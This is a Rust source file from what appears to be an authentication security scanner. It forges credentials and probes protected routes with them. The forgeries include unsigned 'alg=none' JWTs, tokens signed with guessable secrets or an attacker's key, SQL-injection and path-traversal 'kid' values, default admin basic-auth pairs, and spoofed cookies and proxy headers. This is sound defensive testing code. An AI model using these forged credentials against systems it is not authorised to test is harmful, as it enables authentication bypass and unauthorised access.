//! Forged credentials against every route that said "no" to anonymous callers.
//!
//! These are the attacks a bad actor tries first: unsigned tokens, tokens signed with guessable
//! secrets, tokens signed with the attacker's own key, `kid` games, default basic-auth pairs. A
//! single 2xx anywhere is a critical authentication bypass.

use crate::census::Route;
use crate::finding::{Finding, Severity};
use crate::scan::Ctx;
use crate::wire::{Probe, Target};
use quench_core::base64::URL_SAFE_NO_PAD;
use quench_core::time::Time;
use quench_crypto::ed25519::SigningKey;
use quench_crypto::jwt::{Algorithm, EncodingKey, Header, encode};
use quench_serde::{Value, json};

/// One forged credential: a label and the headers that carry it.
#[derive(Debug, Clone)]
pub struct Forgery {
    pub label: String,
    pub headers: Vec<(&'static str, String)>,
}

fn claims(audiences: &[String], exp_offset: i64) -> Value {
    let now = Time::now().timestamp();
    let aud: Vec<String> = audiences.iter().map(|a| format!("\"{a}\"")).collect();
    let text = format!(
        r#"{{"sub":"sectest-admin","scope":"admin write read","roles":["admin"],"aud":[{}],"iss":"gatehouse","iat":{now},"exp":{}}}"#,
        aud.join(","),
        now + exp_offset
    );
    json::parse_slice(text.as_bytes()).unwrap_or(Value::Null)
}

fn bearer(label: &str, token: &str) -> Forgery {
    Forgery {
        label: label.to_string(),
        headers: vec![("Authorization", format!("Bearer {token}"))],
    }
}

/// Every forged credential this check tries.
#[must_use]
pub fn forgeries(audiences: &[String]) -> Vec<Forgery> {
    let b64 = |bytes: &[u8]| URL_SAFE_NO_PAD.encode(bytes);
    let payload = claims(audiences, 3600);
    let payload_text = json::to_string(&payload);
    let mut out = Vec::new();

    for alg in ["none", "None", "NONE"] {
        let header = format!(r#"{{"alg":"{alg}","typ":"JWT"}}"#);
        out.push(bearer(
            &format!("alg={alg}, no signature"),
            &format!(
                "{}.{}.",
                b64(header.as_bytes()),
                b64(payload_text.as_bytes())
            ),
        ));
    }

    for secret in ["secret", "", "changeme", "jwt_secret", "gatehouse"] {
        if let Ok(token) = encode(
            &Header::new(Algorithm::HS256),
            &payload,
            &EncodingKey::from_secret(secret.as_bytes()),
        ) {
            out.push(bearer(&format!("HS256 with secret {secret:?}"), &token));
        }
    }

    let attacker = SigningKey::generate();
    if let Ok(key) = EncodingKey::from_ed_der(&attacker.to_pkcs8_der()) {
        for kid in [
            None,
            Some("sectest"),
            Some("../../../dev/null"),
            Some("' OR '1'='1"),
        ] {
            let mut header = Header::new(Algorithm::EdDSA);
            header.kid = kid.map(str::to_string);
            if let Ok(token) = encode(&header, &payload, &key) {
                out.push(bearer(
                    &format!("EdDSA with attacker key, kid={kid:?}"),
                    &token,
                ));
            }
        }
        if let Ok(token) = encode(
            &Header::new(Algorithm::EdDSA),
            &claims(audiences, -7200),
            &key,
        ) {
            out.push(bearer("EdDSA attacker key, already expired", &token));
        }
    }

    out.push(bearer("garbage token", "x.y.z"));
    out.push(bearer("literal null", "null"));
    out.push(bearer("literal undefined", "undefined"));
    out.push(bearer("empty bearer", ""));
    out.push(bearer("oversized token", &"A".repeat(8000)));

    for (label, pair) in [
        ("admin:admin", "YWRtaW46YWRtaW4="),
        ("admin:password", "YWRtaW46cGFzc3dvcmQ="),
    ] {
        out.push(Forgery {
            label: format!("basic auth {label}"),
            headers: vec![("Authorization", format!("Basic {pair}"))],
        });
    }
    out.push(Forgery {
        label: "forged session cookies".to_string(),
        headers: vec![(
            "Cookie",
            "session=admin; sid=admin; session_id=1; access_token=admin".to_string(),
        )],
    });
    out.push(Forgery {
        label: "trusted-proxy identity headers".to_string(),
        headers: vec![
            ("X-Forwarded-User", "admin".to_string()),
            ("X-Remote-User", "admin".to_string()),
            ("X-Auth-User", "admin".to_string()),
            ("X-Forwarded-For", "127.0.0.1".to_string()),
        ],
    });
    out
}

pub async fn run(ctx: &Ctx, target: &Target, protected: &[Route]) -> Vec<Finding> {
    let audiences: Vec<String> = ctx.opts.targets.iter().map(|t| t.name.clone()).collect();
    let forged = forgeries(&audiences);
    let mut findings = Vec::new();

    for route in protected {
        if route.is_mutating() && !ctx.opts.active {
            continue;
        }
        for forgery in &forged {
            let mut probe = Probe::new(&route.method, &route.sample_path());
            if matches!(route.method.as_str(), "POST" | "PUT" | "PATCH") {
                probe = probe.json("{}");
            }
            for (name, value) in &forgery.headers {
                probe = probe.header(name, value);
            }
            let Some(reply) = ctx.send(target, &probe).await else {
                continue;
            };
            let (severity, what) = match reply.status {
                401 | 403 | 404 | 405 => continue,
                200..=299 => (
                    Severity::Critical,
                    "AUTHENTICATION BYPASS: a forged credential was accepted".to_string(),
                ),
                500..=599 => (
                    Severity::Medium,
                    format!("forged credential crashed the handler ({})", reply.status),
                ),
                other => (
                    Severity::Medium,
                    format!("forged credential produced unexpected status {other}"),
                ),
            };
            findings.push(Finding::new(
                severity,
                "tokens",
                &target.name,
                &route.method,
                &route.pattern,
                format!("{what}: {}", forgery.label),
            ));
            // One bypass per route is the finding; do not hammer the rest of the list.
            if severity == Severity::Critical {
                break;
            }
        }
    }
    findings
}
